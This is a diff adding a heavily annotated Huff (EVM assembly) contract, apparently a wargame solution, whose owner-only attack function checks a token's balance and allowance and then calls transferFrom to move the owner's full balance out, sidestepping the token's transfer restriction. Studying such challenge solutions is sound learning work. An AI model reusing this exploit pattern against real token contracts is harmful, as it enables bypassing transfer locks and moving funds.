@@ -1,0 +1,250 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [msg.sender]
+    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
+    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// Attack function
+#define macro ATTACK() = takes(0) returns (0) {
+    // Copy `balanceOf(address)` func sig + msg.sender into memory to use as calldata for STATICCALL
+    0x70a08231      // [0x70a08231] - func sig for `balanceOf(address)`
+    0x00            // [0x00, 0x70a08231] - byte offset
+    mstore          // [] - copied func sig into memory starting at byte offset 0x00
+    caller          // [owner] - we know msg.sender is caller because of modifier
+    0x20            // [0x20, owner] - byte offset
+    mstore          // [] - copied owner into memory starting at byte offset 0x20
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+
+    // Copy self into memory for future STATICCALL
+    address         // [address] - self
+    0x40            // [0x40, address] - byte offset
+    mstore          // [] - copied self into memory starting at offset 0x40
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64] 000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+
+    // STATICCALL into instance
+    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is
+    sload           // [instance] - copied instance address onto stack from storage slot 0x01
+    0x20            // [0x20, instance] - size of return data (uint256)
+    0x60            // [0x60, 0x20, instance] - byte offset in memory of where to copy return data
+    0x24            // [0x24, 0x60, 0x20, instance] - size of calldata (func sig + address)
+    0x1c            // [0x1c, 0x24, 0x60, 0x20, instance] - byte offset in memory where calldata begins
+    dup5            // [instance, 0x1c, 0x24, 0x60, 0x20, instance] - duplicated instance to top of stack
+    gas             // [gas, instance, 0x1c, 0x24, 0x60, 0x20, instance] - gas to send with call (gasleft())
+    staticcall      // [success, instance] - consumes 6 items off stack and pushes 1 onto stack if call was successful, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64] 000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - balanceOf call
+
+
+    // Copy `allowance(address,address)` into memory to use as calldata for STATICCALL
+    0xdd62ed3e      // [0xdd62ed3e, instance] - func sig for `allowance(address,address)`
+    0x00            // [0x00, 0xdd62ed3e, instance] - byte offset
+    mstore          // [instance] - copied func sig into memory starting at offset 0x00 (wrote over `balanceOf(address)`. Not efficient)
+
+    // MEMORY:
+    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000dd62ed3e -> `allowance(address,address)` func sig
+    // [OFFSET 32] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64] 000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96] 00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - balanceOf call
+
+    // Copy return data onto stack to use for later comparison
+    0x60           // [0x60, instance]
+    mload          // [return_data, instance]
+
+    // STATICCALL into instance
+    0x20           // [0x20, return_data, instance] - size of return data (uint256)
+    0x60           // [0x60, 0x20, return_data, instance] - byte offset in memory where return data will be copied to
+    0x44           // [0x44, 0x60, 0x20, return_data, instance] - size of calldata (func sig + address + address)
+    0x1c           // [0x1c, 0x44, 0x60, 0x20, return_data, instance] - byte offset in memory where calldata starts
+    dup6           // [instance, 0x1c, 0x44, 0x60, 0x20, return_data, instance] - duplicated instance to top of stack
+    gas            // [gas, instance 0x1c, 0x44, 0x60, 0x20, return_data, instance] - gas to send with call (gaslef())
+    staticcall     // [success, return_data, instance] - consumes 6 items off stack. pushes 1 if successful, 0 otherwise
+    iszero         // [0/1, return_data, instance]
+    throw_error    // [throw_error, 0/1, return_data, instance]
+    jumpi          // [return_data, instance]
+    dup1           // [return_data, return_data, instance] - duplicated return_data for another future comparison
+    
+    // MEMORY:
+    // [OFFSET 0]   00000000000000000000000000000000000000000000000000000000dd62ed3e -> `allowance(address,address)` func sig
+    // [OFFSET 32]  0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - allowance call
+
+    // Check return data from allowance call and verify it is eq to the return data from balanceOf call
+    0x60           // [0x60, return_data, return_data, instance] - byte offset
+    mload          // [recent_return_data, return_data, return_data, instance] - copy return data from allowance call onto stack
+    eq             // [0/1, return_data, instance] - consumes top two items and pushes 1 onto stack if they are equal, 0 otherwise
+    iszero         // [0/1, return_data, instance] 
+    throw_error    // [throw_error, 0/1, return_data, instance]
+    jumpi          // [return_data, instance]
+
+    // Copy `transferFrom(address,address,uint256)` into memory to use as calldata for CALL
+    0x23b872dd     // [0x23b872dd, return_data, instance] - func sig `transferFrom(address,address,uint256)`
+    0x00           // [0x00, 0x23b872dd, return_data, instance] - byte offset
+    mstore         // [return_data, instance] - copied func isg into memory starting at offset 0x00 (writing over prev func is)
+
+    // MEMORY:
+    // [OFFSET 0]   0000000000000000000000000000000000000000000000000000000023b872dd -> `allowance(address,address)` func sig
+    // [OFFSET 32]  0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - allowance call
+
+    // CALL into instance
+    0x00           // [0x00, return_data, instance] - size of return data (don't care)
+    0x00           // [0x00, 0x00, return_data, instance] - offset in memory where return data will get copied
+    0x64           // [0x64, 0x00, 0x00, return_data, instance] - size of calldata (func sig + address+ address + uint256)
+    0x1c           // [0x1c, 0x64, 0x00, 0x00, return_data, instance] - offset in memory where calldata starts
+    0x00           // [msg.value, 0x1c, 0x64, 0x00, 0x00, return_data, instance] - msg.value (none)
+    dup7           // [instance, msg.value 0x1c, 0x64, 0x00, 0x00, return_data, instance] - calling instance
+    gas            // [gas, instance, msg.value 0x1c, 0x64, 0x00, 0x00, return_data, instance] - gas to send with call (gasleft())
+    call           // [success, return_data, instance] - consumes top 7 items. pushes 1 onto stack if call did not revert, 0 otherwise
+    iszero         // [0/1, return_data, instance]
+    throw_error    // [throw_error, 0/1, return_data, instance]
+    jumpi          // [return_data, instance]
+
+    // Copy `balanceOf(address)` func sig into memory to use as calldata for STATICCALL (I should make this more efficient)
+    0x70a08231     // [0x70a08231, return_data, instance] - func sig for `balanceOf(address)`
+    0x00           // [0x00, 0x70a08231, return_data, instance] - byte offset
+    mstore         // [return_data, instance] - copied func sig into memory at offset 0x00 (writing over prev func sig)
+
+    // MEMORY:
+    // [OFFSET 0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32]  0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - allowance call
+
+    // STATICCALL into instance
+    0x20           // [0x20, return_data, instance] - size of return data (uint256)
+    0x60           // [0x60, 0x20, return_data, instance] - byte offset in memory where return data will be copied to
+    0x24           // [0x24, 0x60, 0x20, return_data, instance] - size of calldata (func sig + address + address)
+    0x1c           // [0x1c, 0x24, 0x60, 0x20, return_data, instance] - byte offset in memory where calldata starts
+    dup6           // [instance, 0x1c, 0x24, 0x60, 0x20, return_data, instance] - duplicated instance to top of stack
+    gas            // [gas, instance 0x1c, 0x24, 0x60, 0x20, return_data, instance] - gas to send with call (gaslef())
+    staticcall     // [success, return_data, instance] - consumes 6 items off stack. pushes 1 if successful, 0 otherwise
+    iszero         // [0/1, return_data, instance]
+    throw_error    // [throw_error, 0/1, return_data, instance]
+    jumpi          // [return_data, instance]
+
+    // MEMORY:
+    // [OFFSET 0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32]  0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  0000000000000000000000000000000000000000000000000000000000000000 -> return data (uint256) - 2nd balanceOf call
+
+    // Check return data and verify that it is 0
+    0x60           // [0x60, return_data, instance] - byte offset
+    mload          // [recent_return_data, return_data, instance] - copy the most recent return data onto stack 
+    throw_error    // [throw_error, recent_return_data, return_data, instance]
+    jumpi          // [return_data, instance]
+
+    // Copy self into memory (offset 0x20) to use as calldata in STATICCALL
+    address        // [self, return_data, instance]
+    0x20           // [0x20, self, return_data, instance] - byte offset
+    mstore          // [return_data, instance] - copied self into memory starting from byte offset 0x20 (wrote over owner)
+
+    // MEMORY:
+    // [OFFSET 0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  0000000000000000000000000000000000000000000000000000000000000000 -> return data (uint256) - 2nd balanceOf call
+
+    // STATICCALL into instance
+    0x20           // [0x20, return_data, instance] - size of return data (uint256)
+    0x60           // [0x60, 0x20, return_data, instance] - byte offset in memory where return data will be copied to
+    0x24           // [0x24, 0x60, 0x20, return_data, instance] - size of calldata (func sig + address + address)
+    0x1c           // [0x1c, 0x24, 0x60, 0x20, return_data, instance] - byte offset in memory where calldata starts
+    dup6           // [instance, 0x1c, 0x24, 0x60, 0x20, return_data, instance] - duplicated instance to top of stack
+    gas            // [gas, instance 0x1c, 0x24, 0x60, 0x20, return_data, instance] - gas to send with call (gaslef())
+    staticcall     // [success, return_data, instance] - consumes 6 items off stack. pushes 1 if successful, 0 otherwise
+    iszero         // [0/1, return_data, instance]
+    throw_error    // [throw_error, 0/1, return_data, instance]
+    jumpi          // [return_data, instance]
+
+    // MEMORY:
+    // [OFFSET 0]   0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [0FFSET 64]  000000000000000000000000a3795886f267fb8f90fde4181f288dc691641b60 -> self
+    // [OFFSET 96]  00000000000000000000000000000000000000000000d3c21bcecceda1000000 -> return data (uint256) - 3rd balanceOf call
+
+    // Check return data and compare it against the first return data we copied onto stack
+    0x60           // [0x60, return_data, instance] - byte offset
+    mload          // [recent_return_data, return_data, instance] - copied return data onto stack
+    eq             // [0/1, instance] - comparing top two items to see if they are equal
+    iszero         // [0/1, instance]
+    throw_error    // [throw_error, 0/1, instance]
+    jumpi          // [instance]
+    pop            // []
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (0) {
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+
+    dup1         // [func_sig, func_sig]
+    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    throw_error: // label for revert path
+        0x00 0x00 revert
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        ATTACK()
+}
